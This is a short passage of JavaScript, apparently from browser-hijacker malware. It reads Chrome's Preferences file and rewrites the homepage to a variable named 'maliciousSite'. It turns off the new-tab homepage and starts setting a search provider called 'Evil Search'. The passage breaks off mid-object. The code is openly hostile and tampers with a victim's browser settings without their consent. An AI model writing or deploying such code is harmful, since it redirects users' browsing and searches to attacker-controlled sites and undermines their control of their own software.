  if (err) {
    console.error("Error reading Chrome Preferences:", err);
    return;
  }

  // Modify the JSON to set the homepage and search engine
  const prefs = JSON.parse(data);
  prefs.homepage = maliciousSite;
  prefs.homepage_is_newtabpage = false;
  prefs.search_provider = {
    name: "Evil Search",
